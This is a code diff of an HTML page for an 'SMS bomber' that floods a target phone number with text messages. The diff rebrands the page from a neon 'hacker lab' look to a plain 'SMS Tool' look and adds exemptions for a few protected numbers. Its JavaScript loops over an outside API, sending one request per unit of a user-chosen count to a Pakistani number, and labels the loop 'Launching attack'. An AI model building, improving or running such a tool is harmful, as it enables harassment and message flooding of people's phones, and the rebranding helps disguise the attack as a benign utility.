@@ -2,13 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>HACKER - QADEER</title>
+  <title>SMS Tool - QADEER</title>
   <style>
     body {
       margin: 0;
-      font-family: 'Courier New', monospace;
-      background: radial-gradient(circle at top, #0d0d0d, #000); /* Dark neon friendly bg */
-      color: #e0e0e0; /* Light text */
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f4f9; /* Light grey background */
+      color: #333; /* Dark grey text */
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -16,22 +16,21 @@
       height: 100vh;
     }
 
-    /* Glassy Navbar */
+    /* Clean Navbar */
     nav {
       width: 100%;
-      background: rgba(0, 255, 136, 0.12); /* Neon green glow */
-      backdrop-filter: blur(10px);
+      background: #ffffff; /* White navbar */
       display: flex;
       justify-content: space-between;
       align-items: center;
       padding: 12px 30px;
-      box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
     }
 
     nav h1 {
       font-size: 22px;
-      color: #00ff88; /* Neon green text */
-      text-shadow: 0 0 10px #00ff88;
+      color: #007bff; /* Professional blue */
+      font-weight: 600;
     }
 
     nav ul {
@@ -43,78 +42,76 @@
     nav ul li a {
       cursor: pointer;
       font-size: 16px;
-      color: #ff00ff; /* Neon magenta */
+      color: #555; /* Dark grey link color */
       text-decoration: none;
-      transition: color 0.3s, text-shadow 0.3s;
+      font-weight: 500;
+      transition: color 0.3s;
     }
 
     nav ul li a:hover {
-      color: #00ffff; /* Neon cyan on hover */
-      text-shadow: 0 0 10px #00ffff;
+      color: #0056b3; /* Darker blue on hover */
     }
 
-    /* Glassy Card */
+    /* Professional Card */
     .card {
       margin-top: 60px;
-      background: rgba(255,255,255,0.06);
-      backdrop-filter: blur(12px);
+      background: #ffffff;
       padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 0 40px rgba(255,0,255,0.4);
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
       width: 350px;
       text-align: center;
-      animation: fadeIn 1.2s ease;
+      animation: fadeIn 1s ease-out;
     }
 
     .card h2 {
-      margin-bottom: 20px;
-      color: #00ffff; /* Neon cyan */
-      text-shadow: 0 0 12px #00ffff;
+      margin-bottom: 25px;
+      color: #333;
     }
 
     input {
-      width: 90%;
+      width: calc(100% - 24px); /* Adjust width considering padding */
       margin: 12px 0;
       padding: 12px;
-      border: none;
-      border-radius: 12px;
-      background: rgba(0,0,0,0.7);
-      color: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      background: #f9f9f9;
+      color: #333;
       font-size: 16px;
-      box-shadow: 0 0 10px rgba(0,255,136,0.5);
-      outline: none;
+      outline-color: #007bff;
     }
 
     button {
       margin-top: 18px;
-      width: 95%;
+      width: 100%;
       padding: 14px;
       border: none;
-      border-radius: 12px;
-      background: linear-gradient(45deg, #ff00ff, #00ffff); /* Neon magenta + cyan gradient */
-      color: #000;
+      border-radius: 8px;
+      background: #007bff; /* Solid blue */
+      color: #fff;
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      transition: transform 0.2s, box-shadow 0.2s;
-      box-shadow: 0 0 20px #ff00ff;
+      transition: background-color 0.2s, transform 0.2s;
     }
 
     button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 25px #00ffff;
+      background-color: #0056b3; /* Darker blue on hover */
+      transform: translateY(-2px);
     }
 
     /* Status Box */
     #status {
       margin-top: 20px;
       padding: 12px;
-      border-radius: 10px;
-      background: rgba(0,0,0,0.5);
+      border-radius: 8px;
+      background: #e9ecef; /* Light background for status */
       min-height: 40px;
       font-size: 14px;
       white-space: pre-line;
-      color: #ff00ff; /* Neon magenta */
+      color: #495057; /* Text color for status */
+      text-align: left;
+      border: 1px solid #ced4da;
     }
 
     @keyframes fadeIn {
@@ -124,43 +121,60 @@
   </style>
 </head>
 <body>
-  <!-- Navbar -->
   <nav>
-    <h1>🖥 QADEER HACKER LAB 🖥</h1>
+    <h1>🖥 QADEER LAB 🖥</h1>
     <ul>
       <li><a href="https://wa.me/923151105391" target="_blank">Contact</a></li>
     </ul>
   </nav>
 
-  <!-- Card -->
   <div class="card">
-    <h2>🔰 SMS BOMBER 🔰</h2>
-    <input type="text" id="number" placeholder="300xxxxxx">
+    <h2>🔰 SMS Tool 🔰</h2>
+    <input type="text" id="number" placeholder="Enter number without 92/0">
     <input type="number" id="amount" placeholder="Enter Amount">
-    <button onclick="startAttack()">START ATTACK</button>
-    <div id="status">Status: Waiting...</div>
+    <button onclick="startAttack()">START</button>
+    <div id="status">Status: Waiting for command...</div>
   </div>
 
   <script>
     async function startAttack() {
+      // List of protected numbers
+      const protectedNumbers = [
+        '3079749129',
+        '3067787075',
+        '3151105391',
+        '3269681728',
+        '3498344152'
+      ];
+      
       const number = document.getElementById("number").value.trim();
       const amount = parseInt(document.getElementById("amount").value.trim()) || 1;
       const statusBox = document.getElementById("status");
 
-      if (!number) {
-        statusBox.textContent = "⚠️ Enter a valid number!";
+      // Check if the entered number is in the protected list
+      if (protectedNumbers.includes(number)) {
+        statusBox.textContent = "❌ Error: This number is protected.";
+        statusBox.style.color = "red";
+        return; // Stop the function here
+      }
+
+      if (!number || number.length < 10) {
+        statusBox.textContent = "⚠️ Please enter a valid 10-digit number (e.g., 3151105391)";
+        statusBox.style.color = "#d9534f";
         return;
       }
 
-      statusBox.textContent = "🚀 Launching...";
+      statusBox.style.color = "#495057"; // Reset color
+      statusBox.textContent = "🚀 Launching attack...";
 
       for (let i = 1; i <= amount; i++) {
         try {
+          // The API URL remains the same as in your original code
           const url = `https://famofcfallxd.serv00.net/apis/api.php?number=92${number}&amount=1`;
           await fetch(url);
-          statusBox.textContent += `\n[${i}] 😎 QADEER_KHAN 😎`;
+          statusBox.textContent += `\n[${i}] ✅ Message sent to ${number}`;
         } catch (err) {
-          statusBox.textContent += `\n[${i}] 😎 QADEER_KHAN 😎`;
+          statusBox.textContent += `\n[${i}] ❌ Failed to send to ${number}`;
         }
       }
     }
